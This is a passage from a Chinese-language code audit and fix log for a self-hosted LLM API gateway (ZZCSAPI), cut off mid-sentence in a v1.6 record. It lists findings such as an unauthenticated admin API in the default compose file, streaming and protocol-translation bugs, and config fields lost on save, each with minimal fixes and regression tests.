# Ponytail 审查：ZZCSAPI 全项目

范围：server.js（4218 行）、Dockerfile/docker-compose.yml、config.json 形态（不看密钥内容）、build/* 与 console-redesign.html（独立子代理只读审查）、两份前端文档交叉核对。
方法：加载 Ponytail full 阶梯（YAGNI → 复用 → 标准库 → 原生 → 已有依赖 → 一行 → 最少代码），主审先追完整调用链再下结论，每个发现给 file:line 证据；独立只读审查前端后合并。
**本轮只审查不修复产品代码。**「中/低」是整改优先级，不冒充漏洞利用等级；未发现的缺陷不等于不存在；本轮不是渗透测试。

> **整改记录（2026-09-27，v0.7）**：PT01 / PT03 / PT05 / PT06 / PT07 已全部完成整改（PT03 取方案 (c) 彻底撤 arena，含 chromium 全家桶移除、镜像 1.31GB→203MB，`docs/arena-protocol.md` 留档）；前端独立审查的清理类发现 PT08/PT10/PT11/PT13/PT14/PT15/PT16/PT17/PT18/PT20/PT21 同批落地，详见 §前端独立审查 各条状态。处置明细见 [frontend-console-detailed.md §8.7](./frontend-console-detailed.md)。
> **整改记录（2026-09-27，v0.8）**：**PT02 已取方案 (b) 完成整改**——proxy 对全部 openai 系协议真实生效（探测/测试/聊天经 curl `-x` 转发），实测含死端口拒绝、Clash 探测、流式 SSE 完整回放；PT09/PT12/PT19 登记进 detailed §9 后续可做；**PT04（探测双路径）仍待下次动探测逻辑时顺带收敛**。处置明细见 [frontend-console-detailed.md §8.8](./frontend-console-detailed.md)。
> **整改记录（2026-09-27，v1.0）**：PT01 同主题的**分发场景加固**——原 compose 里写死的固定默认密钥（`ADMIN_KEY`/`GATEWAY_KEY` 都给了公共字符串）等于把每个部署的管理密钥公开在仓库里（谁拿到项目谁就知道），且 `checkAuth` 存在"空 key 就放行"。现改为：默认留空 → **首启自动生成 48 位随机密钥**（打印到容器日志并写回 config.json）+ 控制台「输入管理密钥」登录门（壳页面放行、管理 API 仍每次校验、密钥记忆由 sessionStorage 升为 localStorage）。明细见 [frontend-console-detailed.md §8.10](./frontend-console-detailed.md)。
> **整改记录（2026-09-27，v1.1）**：做「Gemini 多模态（图片）适配」时**顺带实测出 PT23 / PT24 / PT25**——PT23 让 Gemini / Anthropic 两条客户端协议的**非流式请求从来就是 502**，PT24 让**原生 Gemini / Anthropic SDK 直连一律 401**，PT25 让 **Anthropic 的 url 型图片源变成一张空图**（静默丢图的第三种写法）；三个都与会话本次目标无关，但同批修复并各自加了回归。同批落地：Gemini `inlineData`/`fileData` + Anthropic `image`(base64/url) 图片入站转换 + 三条客户端协议共用的「图片能力门」（`IMAGE_CAPABLE_PROTOCOLS`，防止静默丢图）；新增零依赖回归 `test/gemini-multimodal.test.js`（40 项断言）与 `test/gemini-multimodal-e2e.test.js`（22 项断言，真起假上游 + 临时网关）。明细见 §PT23 / §PT24 / §PT25 与 README「含图请求的候选裁剪」。

## 结论

**无需推倒重写、无需引入框架/依赖，也不该拆单文件。**零依赖单文件 + 构建管线 + host-mounted config 是正确的懒架构；鉴权咽喉点干净（每路由先 checkAuth 再 dispatch）。真正要动的是**一个部署面信任边界缺口（PT01，实测已复现）**、一个静默功能陷阱（PT02）、一个有真实成本但没有需求方的休眠特性（PT03）。probeChannel/probeDef 双路径等维护面问题留给下次动探测逻辑时顺手收敛。

## 建议处理项（均未修改）

### PT01 高（信任边界·部署面）：NOAUTH 默认 1 + 端口绑 0.0.0.0，管理面全开

- 证据：[docker-compose.yml:13](../docker-compose.yml) `ZZCSAPI_NOAUTH: ${ZZCSAPI_NOAUTH:-1}`（默认即免鉴权）；[docker-compose.yml:8](../docker-compose.yml) `"8787:8787"` 绑所有网卡；[server.js:194](../server.js) `if (NOAUTH) return true` 先于一切 key 判断短路；[server.js:1240](../server.js) `channelStatusAll` 下发渠道**明文 apiKey**。
- 实测（本机复现，非推断）：`GET /admin/api/status` 无任何凭证 → **200 全量渠道（含上游明文 key）**；`POST /v1/chat/completions` 无凭证 → **200 并真实消耗了上游付费额度**。compose 里的 ADMIN_KEY/GATEWAY_KEY 在 NOAUTH=1 下不起任何作用。
- 影响面：局域网内任何设备可读走全部渠道上游 key、增删改渠道、烧光付费额度；若路由器做过 8787 端口转发则直接暴露公网。
- 最小修复（两行 compose，零代码）：`ports` 改 `"127.0.0.1:8787:8787"`；NOAUTH 默认改 `${ZZCSAPI_NOAUTH:-0}`。你现有全部客户端（console `?key=`、DSH Bearer）都带 key，翻成 0 不破坏任何工作流；若确需局域网访问则保留 0.0.0.0 但必须 NOAUTH=0。
- 最小回归：改后本机 `curl -H "Authorization: Bearer $ZZCSAPI_GATEWAY_KEY"` 网关调用全通、console 正常打开、`docker compose` 健康检查（healthz 免鉴权）不受影响。

### PT02 中：渠道 proxy 字段只对 genspark/codex 生效，其余协议静默忽略 ✅ 已整改（v0.8，方案 b）

- 证据：`wbCurlRequest`（[server.js:796](../server.js)）支持 proxy 参数，但传它的只有 genspark（3395/3401）与 codex（3573/3624/3644/3711）；workbuddy 三处全不传（探测 855、测试 1990、聊天 3208）；generic openai 探测 542（fetch）与 CF 回退 553、generic 聊天 2530/2534（fetch + psHttpRequest，该函数无 proxy 参数）全部直连。
- 观察：静态确认全部调用点。当前 30 渠道只有 genspark 配了 proxy 所以**今天没有实际故障**；但表单 proxy 帮助文案只写「codex / genspark 必填」，未说其他协议填了不生效。给 openai 渠道填 proxy 期待走 Clash（典型场景：agentrouter.org 这类被 DNS 污染的上游）会静默直连然后超时，排查成本高。
- 最小修复（二选一）：(a) 0 行逻辑——`validateChannelDef` 对非 curl 系协议携带 proxy 时返回警告 + 表单帮助注明「仅 codex/genspark 生效」；(b) ~10 行——`curlHttpRequest` 加可选 proxy 参数（curl -x），probeChannel/probeDef/tryOpenAIChannel 三个 generic 点在 `def.proxy` 时改走 curl。ponytail 默认 (a)，真出现需要 proxy 的 openai 渠道再升级 (b)。
- 最小回归：(a) 配 proxy 的 openai 渠道保存时出警告；(b) 探测经代理可达。
- **处置（v0.8）**：取方案 (b) 且复用现成 `wbCurlRequest`（未新造客户端）——tryChannel 聊天出站、probeChannel/probeDef 探测、/admin/api/test 迷你聊天各加代理分支，workbuddy 三处补传第 6 参；帮助文案与 README 同步改为明示生效范围。实机回归按「(b) 探测经代理可达」执行并全绿：死端口代理被拒、Clash 7897 探测 ok（42 模型）、代理渠道流式聊天 SSE 完整回放、非流式 200、直连与 genspark 原链路无回归。过程中实测抓到并修掉一个首版疏漏（代理分支漏设 `respBody` 致流式回放空 body）。明细见 [frontend-console-detailed.md §8.8](./frontend-console-detailed.md)。

### PT03 中·决策项：arena 协议休眠，镜像为它背 1.31GB

- 证据：[Dockerfile](../Dockerfile) `apk add chromium nss freetype harfbuzz ttf-freefont`（注释明说给 arena 浏览器 sidecar）+ `--experimental-websocket`（CDP 用）；config.json 30 渠道协议普查 = openai 20 / notion 7 / notion-agent 1 / workbuddy 1 / genspark 1，**arena 0**；`docker images zzcsapi:local` = **1.31GB**（node:20-alpine 基础约 130MB，大头是 chromium 系）；arena.js/tool-emu.js 每次 boot 都 require（server.js:17-18，加载无害）。
- 观察：arena 是刻意构建、有文档（docs/arena-protocol.md）的完整特性，**不是死代码**；但当前没有渠道用它，1.31GB 镜像体积 + 构建时间是每次部署都在付的真实成本。
- 最小修复（用户决策）：(a) 保留现状（随时能接 arena 渠道）；(b) Dockerfile 用 `ARG ARENA=0` 条件安装 chromium 系（保留协议代码，默认镜像瘦回 ~150MB，要接 arena 时 `--build-arg ARENA=1`）；(c) 彻底撤 arena（同 prism 的先例）。ponytail 立场：YAGNI 不溯及已完成的特性，但 (b) 成本一行、收益每次构建。
- 最小回归：(b) 默认构建后 healthz 正常、genspark/openai/notion 全链路不受影响。

### PT04 低：probeChannel 与 probeDef 双路径

- 证据：probeChannel（[server.js:422-584](../server.js)）逐协议分支 + generic 尾巴（fetch 542 → CF 回退 553 → extractModelIds 570 → 写渠道状态）；probeDef（[server.js:610-736](../server.js)）同样逐协议分支 + generic 尾巴（fetch → CF 回退 720 → extractModelIds）。底层探测 helper 共享（gensparkIsLogin/workbuddyChatProbe/notion*），但分支脚手架与 generic 尾巴是两份。
- 观察：当前两份行为同步（probe-headers 修复落在共享的 probeHeadersForDef，两边同时生效）。漂移风险是结构性的：历史先例 51f2c49（/admin/api/test 漏 prism 分支）就是「一个协议要接 4 个点、漏 1 个」的实例。
- 最小修复：下次动探测逻辑时把 probeChannel 的逐协议分支收敛为「调 probeDef(def) 拿结果 → 只做状态落盘」，约可删 120 行脚手架。不建议现在专门做。
- 最小回归：genspark/workbuddy/notion 三协议各做一次周期探测与表单探测，行为一致。

### PT05 低：probeUrlFor / probeMethodFor / probeHeadersFor 三个单行包装

- 证据：[server.js:737-739](../server.js) 定义，唯一调用方 probeChannel（538/543/544/553）；probeDef 直接用 *Def 变体。`probeMethodFor()` 无参恒返 `'GET'`。
- 最小修复：probeChannel 直接调 `probeUrlForDef(ch.def)` 并内联 `'GET'`，删三个包装。
- 最小回归：一次渠道周期探测与改前一致。

### PT06 低：文档行数漂移

- 证据：[docs/frontend-code-map.md:36](./frontend-code-map.md) server.js 写 ~4400，实测 4218 行。
- 最小修复：改 ~4200。
- 最小回归：无。

### PT07 低：两个已知天花板缺 `ponytail:` 标记

- 证据与观察：
  1. `bumpRoll`（server.js:1384）滚动健康分纯内存，容器重启清零——设计如此但未标注。
  2. 渠道连败 3 次进 `down` 桶后，周期探测成功会立刻清零 consecutiveFail 治愈回池（server.js:574）；坏渠道在滚动样本攒到 5 个之前，每个探测周期最多再被真实流量撞 3 次——**实测复现过**（agentrouter 补样本实验中 roll 冻结在 f=3，65 秒间隔绕开冷却才攒满）。
- 最小修复：各加一行注释——`// ponytail: 内存态重启清零，跨重启记忆写 usage.json byChannel`；`// ponytail: 探测治愈重置熔断，坏渠道靠滚动失败率兜底（≥5 样本降 3 级）`。
- 最小回归：无行为变化。

### PT23 中：非流式路径交给 handler 的 shim 缺 `json()` —— ✅ v1.1 已整改（一行）

- 来源：做「Gemini 多模态」的端到端验证时实测撞到（**不是静态推断**：假上游 + 临时网关实例复现，与图片改动无关的既有 bug）。
- 证据（`server.js`，整改前）：`tryChannel` 非流式成功分支先 `await resp.text()` 读全文（统计用量），
  然后构造 `const shim = { ok, status, headers, text: async () => text }` 交给 `onSuccessNonStream(shim, candidate)`——
  **没有 `json()`**；而 `/anthropic/v1/messages` 与 `/gemini/v1beta/...` 两条路由的 `onSuccessNonStream` 实现里都是
  `const oaiBody = await oai.json()`。于是调用即抛 `TypeError: oai.json is not a function`，被同函数的 `catch` 兜成
  `internal: …` → 记一次渠道失败 + 502 `all channels failed`（**还会把健康渠道推进冷却**）。
- 观察：**流式反而正常**（流式走 `onStreamChunk`，不碰 shim），OpenAI 路由也正常（它只用 `shim.text()`）。
  所以症状是「Gemini/Anthropic 协议 + 非流式（多数客户端的默认模式）= 一律 502，流式却好用」，
  报错文案又只有 `internal: oai.json is not a function`，从客户端看不到根因；极易被当成「上游不支持」。
  本仓库 30 条渠道全是 openai/notion 系（无人用 gemini/anthropic 客户端协议），因此长期未被发现。
- 最小修复：给 shim 补 `json: async () => JSON.parse(text)`（shim 是 fetch `Response` 的替身，就该同时具备两个读法）。
- 最小回归：临时实例 + 假 OpenAI 上游，`POST /gemini/v1beta/models/{m}:generateContent` 与
  `POST /anthropic/v1/messages`（均非流式）→ 200 且响应被正确转成各自协议形态；流式路径与 OpenAI 路由行为不变。
- **处置（v1.1）**：按最小修复落地（`server.js` 非流式 shim 一行），并由 `test/gemini-multimodal.test.js`
  的端到端姊妹脚本（临时实例 + 假上游，一次性验证、不入库）实测 17 项断言全绿。

### PT24 中：`checkAuth` 不认原生 SDK 的鉴权头 —— ✅ v1.1 已整改（数行）

- 来源：真机验证「Gemini 协议能不能带图」时，用 Gemini 原生头 `x-goog-api-key` 打活体网关 → **401 `gateway key required`**（实测，不是推断）。
- 证据（`server.js`，整改前）：`checkAuth` 只匹配 `Authorization: Bearer <key>` 与 `?key=<key>` 两条路径；
  而**官方 SDK 的默认鉴权头各不相同**——Gemini SDK 发 `x-goog-api-key`（另一模式才是 URL 里的 `key=`），
  Anthropic SDK 发 `x-api-key`，只有 OpenAI SDK 恰好是 Bearer。
- 观察：症状是「README 让你把 baseURL 指向网关，但官方 Gemini/Anthropic SDK 复制过去直接 401」，
  而从客户端看只是"密钥不对"，很容易被误判成密钥配置问题。`?key=` 那条路能过，所以"用 curl 拼 URL"的
  自测全绿、掩盖了 SDK 的真实行为（**自测方式与被测对象不一致**的典型）。
- 最小修复：`checkAuth` 在 **gateway 侧**追加两个头判定；管理面**刻意不接受**这两个头，避免把客户端密钥语义混进管理面。
- 最小回归：只带 `x-goog-api-key` / `x-api-key` 调 `/gemini/*` `/anthropic/*` → 200；错误值 → 401；
  管理面带这两个头 → 仍 401、Bearer 仍 200（**无提权**）；`NOAUTH=1` 行为不变。
- **处置（v1.1）**：按最小修复落地，3 项头判定 + 1 处管理面隔离；回归进 `test/gemini-multimodal.test.js` §6（8 项断言，含管理面无提权）。

### PT25 低：Anthropic `source.type='url'` 的图片被拼成空图 —— ✅ v1.1 已整改

- 来源：用户追问"图片到底能不能用"时复核三种协议的图片源，发现 `anthropicToOpenAI` 只处理 base64 形态。
- 证据（`server.js`，整改前）：`imageParts.push({ image_url: { url: 'data:' + (b.source?.media_type || 'image/png') + ';base64,' + (b.source?.data || '') } })`——
  Anthropic 的 `{type:'url', url}` 源没有 `data` 字段 ⇒ 拼出 `data:image/png;base64,`（**一张空图**），
  比直接报错更隐蔽：上游收到空图后照样回答，用户以为图片发送成功了。
- 最小修复：按 `source.type` 分流——`url` 型透传直链；`base64` 型拼 data URL；两种都没有（空 source）则**不产出任何 block**。
- 最小回归：base64 源 mime 原样保留、url 源成直链、空 source 不产图片块，且该形态能被「图片能力门」正确识别（`test/gemini-multimodal.test.js` §5）。
- **处置（v1.1）**：按最小修复落地。

### PT26 高：流式首块字节被吞 —— 快上游下发时三条客户端协议全部返回空响应体 —— ✅ v1.2 已整改

- 来源：做 v1.2（Anthropic tool_use 完整转换）时，端到端脚本里"流式工具回合"一条断言都过不了，
  顺着空响应体查到了通用读循环。
- 证据（`server.js` `tryChannel` 通用流式分支，整改前）：
  ```js
  let buf = firstVal ? decoder.decode(firstVal, { stream: true }) : '';   // ← 首块只进了 buf
  while (true) { const { done, value } = await reader.read(); if (done) break; ... 按行分发 ... }
  // 收尾：只有存在 onStreamChunk 时才处理 buf
  ```
  首块字节**从未经过按行分发**；上游若把整个流一次送达（快线路 / 小回答），下一次 `read()` 直接 `done`，
  透传路由（`/v1/chat/completions` 不传 `onStreamChunk`）**一个字节都不写** ⇒ 客户端拿到
  `HTTP 200 + text/event-stream` 却**空响应体**；带 `onStreamChunk` 的路由则把多行糊成一坨丢给
  逐行解析器（`JSON.parse` 失败 → 同样什么都没写出）。
- 实测证据：临时假上游"一次写完 4 个 chunk + end"时，`/v1/chat/completions`、`/anthropic/v1/messages`、
  `/gemini/...:streamGenerateContent` 三条路由**全部** `len=0`。
- 最小修复：首块字节走同一条 `drain()` 按行分发；循环结束后 `decoder.decode()` 冲残留并做 `drain(true)`；
  收尾分支对**两种**路由都生效（透传也补回分隔空行）。
- 最小回归：`test/streaming-e2e.test.js` §1/§2（快/慢两种节奏 × 字节级透传）。

### PT27 高：Anthropic 流式转换器无状态 —— 流式工具调用必然碎、`message_start` 重复 —— ✅ v1.2 已整改

- 证据（`server.js` Anthropic 路由，整改前）：`onStreamChunk` 每收到**一行**上游数据就
  `openAIStreamToAnthropicSSE([j], requested)` 新建一次生成器 ⇒ 每个 chunk 重发 `message_start`；
  `tool_calls` 的参数分片（`{"city"` 与 `:"上海"}`）落在**两个不同的 `tool_use` 块**里，客户端拼出来是碎的。
  同时 `dispatchRequest` 组装 `tryChannel` 参数时**漏传 `streamPrelude`**（这正是该选项一直无人使用的死因），
  于是连 `message_start` 都发不出来。
- 最小修复：抽出 `createAnthropicStreamConverter(model)`（`start()/push(c)/end()` 三态、`end()` 幂等），
  `openAIStreamToAnthropicSSE` 保留为一次性兼容入口；路由每请求一个转换器实例，
  `streamPrelude`/`streamEpilogue` 由 `dispatchRequest` 转发给 `tryChannel`（上游不发 `[DONE]` 也能收尾）。
- 最小回归：`test/anthropic-tools.test.js` §6B（逐行喂：块只开一次、分片累积、`end()` 幂等、并行工具两块）+
  `test/streaming-e2e.test.js` §3/§4/§5。

### PT28 中：Gemini 流式动作没给出站带 `stream` —— 上游回非流式整包 —— ✅ v1.2 已整改

- 证据（`server.js` Gemini 路由，整改前）：`isStream` 来自 URL 动作（`:streamGenerateContent`），
  但 `geminiToOpenAI(body, model)` 只复制 Gemini body 的 `stream` 字段（Gemini 协议根本没有这个字段）
  ⇒ 出站 `stream: undefined`，上游回**非流式整包 JSON**，而网关按 SSE 往外写（假上游实测日志 `stream=false`）。
- 最小修复：`oaiBody.stream = isStream;`（非流式动作仍为 `false`）。
- 最小回归：`test/streaming-e2e.test.js` §6。

> **整改记录（2026-09-27，v1.2）**：做「Anthropic tool_use 完整转换」时，端到端脚本先把**三个流式缺陷**顶了出来（PT26 首块字节被吞 ⇒ 快上游下三条协议流式全空；PT27 Anthropic 流式转换无状态 + prelude 未转发 ⇒ 流式工具调用必碎、`message_start` 缺失；PT28 Gemini 流式没带 `stream` ⇒ 上游回非流式整包），三个都先修才可能让"流式工具调用"真的可用。同批落地工具转换补全：`tool_choice` 的 `none`、`disable_parallel_tool_use` → `parallel_tool_calls`、`is_error` → `[tool_error]` 标记、**工具结果里的图片改挂紧随的 user 消息**（OpenAI 的 `tool` 消息只允许文本部件）、`tool_use.id` 走 `sanitizeToolId` 保证往返配对、`finish_reason`/`cache_read_input_tokens` 映射。新增零依赖回归 `test/anthropic-tools.test.js`（60 项）、`test/anthropic-tools-e2e.test.js`（30 项，两轮工具回合）、`test/streaming-e2e.test.js`（19 项）。真机验证：流式工具调用收到 `stop_reason=tool_use` 且参数分片拼回 `{"city":"上海"}`；回传 `tool_result` 后模型用工具结果作答；**工具结果里带一张上红下蓝的图，模型答出 "red blue"**（侧门打通）。明细见 §PT26 / §PT27 / §PT28 与 README「工具调用」「流式（SSE）」。

### PT29 中：渠道保存走白名单重建对象 —— 配置里的新字段会被静默抹掉 —— ✅ v1.3 已整改

- 来源：做加权轮询（新增渠道字段 `weight`）时排查"控制台改一下渠道会不会把权重吃掉"。
- 证据（`server.js`，整改前）：
  · `POST /admin/api/channels`（upsert，落库）把 body **重建**成一个固定字段对象
    （`const def = { id, name, baseUrl, apiKey, protocol, priority, enabled, autoAlias, models, proxy, headers }`）
    —— body 里任何白名单外的字段**直接丢弃**；
  · `persistConfig()` 同样按固定字段列表写 `config.json`；
  · 两者叠加的后果：用户在配置文件里手写的扩展字段（本次是 `weight`），只要从控制台**保存一次该渠道**，
    就会从 `config.json` 里永久消失，且没有任何提示（静默数据丢失，最难查的那类）。
- 最小修复：`weight` 进入 4 个位置——`persistConfig()`、`GET /admin/api/channels`、`POST /admin/api/channel`、
  `POST /admin/api/channels`（upsert）；其中 upsert 在 body **未传** `weight` 时**保留旧值**（`prevDef.weight`），
  避免"表单没有这个输入框 ⇒ 一保存就清零"。
- 最小回归：`test/weighted-rr.test.js` §9 装配守卫（`persistConfig` 持久化 weight / upsert 未传时保留旧值 /
  `validateChannelDef` 校验 weight）——这些断言就是防它复发的。
- 遗留：`POST /admin/api/channels` 的白名单机制本身没改（仍是"重建对象"），
  **以后再加渠道字段必须同步这 4 个位置**，否则同样会被抹掉。

> **整改记录（2026-09-27，v1.3）**：落地**真正的加权轮询**（README 里挂了几轮的遗留项）。设计取舍：不动 `priority` 的排序语义，**新增 `weight` 专管分流** —— 只有明确填正数 `weight` 的渠道进轮询池，缺省 0 时行为与从前逐字节一致（老配置零影响，用户正在跑的 30 多个渠道不会被这一版改变选路）。算法选**平滑加权轮询**（SWRR，无随机数）：长期比例 = 权重比，且不扎堆突发；冷却/`down`/`weight=0` 不进池、份额自动归健康成员。轮询只决定"谁是第一位"，其余候选保持原「健康度→有效优先级→延迟」顺序做**兜底链**。实现期发现 PT29（渠道保存的白名单会静默抹掉新字段），一并修掉并把守卫写进回归。新增零依赖回归 `test/weighted-rr.test.js`（31 项，含"老配置零影响"对照组）与 `test/weighted-rr-e2e.test.js`（12 项，真 HTTP 数 40 次落点验证 ≈75/25）。控制台表单暂未加权重输入框（后端已支持，可改配置或调 `POST /admin/api/channel`），已记入 README「计划中」。

### PT30 高：`protocol: anthropic` / `gemini` 的渠道**根本无法用于聊天**（出站永远是 OpenAI 格式） —— ✅ v1.4 已整改

- 来源：用户提出「先做原生 anthropic / gemini 渠道」，排查后发现这不是"缺个功能"，而是**配了也用不了**。
- 证据（`server.js`，整改前）：
  · 四条客户端路由（chat / images / anthropic 侧门 / gemini）注入的出站构造器都是
    `encodeOutgoing: (b, c) => ({ ...b, model: c.upstream })` + `Bearer` + `POST {baseUrl}/chat/completions`；
  · 而 `protocol` 只参与两件事：探活 URL/鉴权头（`probeUrlForDef` / `probeHeadersForDef`）与 `channelsServing` 的协议过滤；
  · 后果：把 OpenAI 格式的请求体发给 `https://api.anthropic.com/v1/messages` 必然 400 —— 渠道声明成 anthropic 协议后，
    连管理员「测试」按钮（`/admin/api/test` 里**已经**按原生报文构造）能通，真聊天却必失败，排查成本极高。
- 最小修复（刻意只动两处，路由侧零改动）：
  · `dispatchRequest` 单点注入 `nativeChannelOpts(proto, requestedModel)`：按候选渠道的 `protocol` 覆盖
    `encodeOutgoing` / `buildOutgoingUrl` / `buildOutgoingHeaders`，并挂 `translateResponse`（非流式）与
    `makeStreamTranslator`（流式）两个钩子；
  · `tryChannel`：`buildOutgoingUrl(ch, candidate, isStream)`（加一个参数，向后兼容）；非流式把翻译后的文本交给既有回调；
    流式把原生 SSE **逐行翻译成 OpenAI SSE** 后再喂给既有 `onStreamChunk`（没有该回调的 OpenAI 路由则直接写翻译结果）。
- 新增（命名避开既有的"入站方向"转换器）：`oaiRequestToAnthropic` / `anthropicToOaiResponse` / `createAnthropicToOaiStream`、
  `oaiRequestToGemini` / `geminiToOaiResponse` / `createGeminiToOaiStream`、`nativeOutgoingUrl/Headers`、
  `nativeResponseTranslator`、`nativeStreamTranslator`。
- 最小回归：`test/native-channels.test.js`（78 项）、`test/native-channels-e2e.test.js`（33 项，真起原生假上游）。

### PT31 高：候选链只捞"自己协议"的渠道 —— 原生渠道进不了候选（PT30 只修了一半） —— ✅ v1.4 已整改

- 证据：修完 PT30 后 e2e 仍 404，`healthz` 与启动日志都正常（`aggregated: openai=[claude-a] anthropic=[claude-a] gemini=[claude-a]`），
  但 `handleOpenAIRequest` 第一行是 `channelsServing(requested, 'openai')` —— 协议过滤把 anthropic 协议渠道挡在候选链之外，
  于是"能力上已经能转"，"调度上却永远选不到"。
- 最小修复：`channelsServing(model, protocol)` 的 `protocol` 支持**数组**（老的单字符串用法逐字节不变），
  三条路由各加一层**跨协议兜底**（同协议优先、跨协议在后，仍排在 notion/codex 等文本链之前）：
  · chat：`['anthropic','gemini']`；侧门：`['openai','gemini']`；gemini 路由：`['openai','anthropic']`。
- 最小回归：`test/native-channels-e2e.test.js` §1/§4（渠道被选中）+ §9（openai 渠道仍优先选中的对照）。

### PT32 中：Gemini 客户端路由的流式**从不发 `finishReason`** —— 客户端永远等不到"回答结束" —— ✅ v1.4 已整改

- 证据（`server.js` `openAIStreamToGeminiSSE`，整改前）：只转发 `delta.content` 文本，
  `finish_reason` 所在的结束分片被整帧丢弃（下游 `onStreamChunk` 只把 `text` 映射成 Gemini chunk）
  ⇒ Gemini 流式客户端只能靠连接断开猜结束（PT26/PT27 修的是另外两条协议的收尾，Gemini 这条漏了）。
- 最小修复：结束分片映射成带 `finishReason` 的 chunk（`length`→`MAX_TOKENS`、`content_filter`→`SAFETY`、其余 `STOP`），
  并把 `usage` 一并映射成 `usageMetadata`。
- 最小回归：`test/native-channels-e2e.test.js` §5（"收尾分片带 finishReason"）。

### PT33 中：Gemini **客户端路由**丢掉工具调用（未整改，已登记）

- 证据：`openAIToGeminiResponse`（非流式）只取 `choices[0].message.content`；`openAIStreamToGeminiSSE` 只取 `delta.content`
  ⇒ 走 `/gemini/...` 的客户端拿不到 `functionCall`，`tools` / `tool_choice` 也在 `geminiToOpenAI` 里无处安放。
  这与渠道协议无关（`openai` 协议渠道同样如此），是**入站方向**的历史缺口，因此本轮不动（改动面涉及工具转换与两条流式路径）。
- 影响面：OpenAI 与 Anthropic 两条路由不受影响（工具调用已完整）。
- 处置：记入 README「计划中」；真要打通时，参照 `openAIStreamToAnthropicSSE` 的有状态写法给 Gemini 侧补
  `functionCall` 映射与 `toolConfig` 三态（`oaiRequestToGemini` 里已有可复用的映射代码）。

> **整改记录（2026-09-27，v1.4）**：用户点名「先做原生 anthropic / gemini 渠道」——这是最后一块结构性缺口。落地**原生出站**：
  内部统一格式（OpenAI）⇄ 上游原生格式双向转换，客户端协议与渠道协议彻底解耦（三条客户端路由 × 两种原生渠道全通）。
  设计上刻意**只动 `dispatchRequest` 与 `tryChannel` 两处**（单点注入 + 逐行翻译），路由侧与既有的入站转换器一行未改，
  好处是"原生"与"客端协议"两个维度可独立演进。顺手修掉排查中顶出来的 PT31（候选链协议过滤）与 PT32（Gemini 结束帧被丢）。
  有损点诚实登记：Anthropic 的 `tool_choice:"none"` 无对应语义（改为去掉 tools）、`cache_control`/`top_k`/thinking 签名跨格式丢弃、
  同协议不做直通；上游错误体**不翻译**（否则 400 会被伪装成"成功但空"的 200）。图片能力门随之从 `['openai']` 扩到
  `['openai','anthropic','gemini']`（原生渠道带图有等价表达：`image` 块 / `inlineData`・`fileData`），
  并按 AGENTS.md 同步了 `test/gemini-multimodal.test.js` 的白名单断言与两处错误文案断言。新增零依赖回归
  `test/native-channels.test.js`（78 项）与 `test/native-channels-e2e.test.js`（33 项，真起原生 Anthropic / Gemini 假上游，
  断言上游**真的收到原生 URL/鉴权头/报文字段**）。全量回归 10 个文件 / 353 项断言通过。
  诚实说明：**本机没有任何 anthropic/gemini 协议的真实渠道**（用户配置里只有 openai 协议渠道），因此真机验证靠的是
  忠实于官方报文形状的假上游 + 临时网关全链路，而非真实第三方端点。

### PT34 中：删光渠道后网关**重启起不来**（`channels: []` 被判成配置损坏）—— ✅ v1.5 已整改

- 证据：`loadConfig`（server.js:230）旧写法 `if (!Array.isArray(cfg.channels) || cfg.channels.length === 0) throw new Error('config.json 缺少 channels 数组')`。
  但控制台删除渠道走 `DELETE /admin/api/channels` → `persistConfig()` 把当时的内存配置写回文件，
  删掉**最后一个**渠道后落盘的就是合法的 `"channels": []`。于是：**用户正常操作 → 重启 → 进程直接抛错退出**，
  而报错文案还在说"缺少 channels 数组"（文件里明明白白有这个数组），把人往"文件被写坏"的方向带。
- 影响面：任何从"多渠道"清到"零渠道"的用户（换中转站、重配环境、第一次试水）都会踩；容器里表现为重启循环。
- 最小修复：只校验类型（`Array.isArray(cfg.channels)`），空数组是合法配置 —— 零渠道时网关正常启动、
  `/admin/api/status` 返回空渠道列表，控制台照常能添加第一个渠道。
- 回归：`test/console-weight-e2e.test.js` 第 0 节（临时网关就用 `"channels": []` 启动，并断言 `/admin/api/status`
  返回空列表）——这个测试本身**必须**从零渠道起步，所以它同时守着这个修复。

> **整改记录（2026-09-27，v1.5）**：用户说「下一步该做权重的事情了」。v1.3 只做了后端的加权算法，
> 控制台没有入口、也看不见效果，所以这轮把**权重做成能用的一等公民**：
> 渠道表单加「权重」输入框（与优先级并排，`title` 里写明"优先级管谁先试、权重管按比例分"）、
> `saveChannel` 显式提交 `weight`（空 = 0；若不是显式提交，upsert 的"缺省即保留旧值"会让"清空权重"被旧值悄悄还原）、
> 前端先挡负数/非数字、渠道表加「权重 / 分流」列（`3 · 24%`，悬停看命中次数）、详情抽屉加角标。
> 未配权重显示 `—` 而**不是 `0%`**（`0%` 会被误读成"配了但一次都没分到"）。顺手修掉 PT34（空渠道配置导致重启起不来）。
> 回归：`test/console-state.test.js` 27 → **38 项**（新增权重一节：`adapt()` 接字段、表格显示、报文带 `weight`、
> 非法值不发请求）+ 新增 `test/console-weight-e2e.test.js`（**18 项**，真链路：控制台报文 → 真网关落库
> （含"权重真的写进 `config.json`"与"未配权重的渠道不会被多写一个 `weight: 0`"）→
> `/admin/api/status` → 控制台渲染出的那一格 → 真发 24 次请求让占比动起来，含"权重改 0 后立刻退出池"）。
> 另修掉一个**测试基建**缺陷：6 个 e2e 脚本在 `kill()` 子进程后立刻 `process.exit()`，Windows 上会撞上未关闭的
> libuv 句柄以 `0xC0000409` 崩溃——**断言全绿却返回失败退出码**（3 次里崩 2 次，随机），已改为等 `exit` 事件 +
> 只设 `process.exitCode`；修补后 18 次运行全部退出码 0。全量回归 **11 文件 / 382 项**通过。
> 诚实说明：本机所有渠道都是 openai 协议且都没配权重（用户配置我一个字节没动），所以控制台那一列在真机上
> 目前显示的全是 `—`；分流效果由临时网关 + 假上游的真实流量验证。

> **整改记录（2026-09-27，v1.6）**：用户问「这个权重会自动吗？能否通过实际的使用过程中自动调整权重？」
> —— 现状是：`weight` 是死配置；已有的自动信号（失败率 → `effPriority`）只影响**兜底顺序**，不影响份额。
> 用户先选"直接做自动生效版"，随后改口「算了先搞个静默观测版吧，看看效果」，于是本轮**只做观测**：
> 后端按真实成功率（复用 `ch.roll`，与有效优先级同一个滚动窗口）+ 延迟 EWMA 算出健康系数与"若启用会怎么分"的预测份额，
> 写进 `/admin/api/status`（顶层 `autoWeight` + 每渠道 `autoH` 等），控制台渠道页顶部新增观测卡、抽屉新增一节，
> **真实调度路径一行未改**（`effective` 恒 `false`，配置里的 `enabled: true` 也只影响标注）。
>
> 工程上最要紧的一条是：**观测必须证明自己无副作用**。最容易的写法是复用 `channelsServing`，但它内置
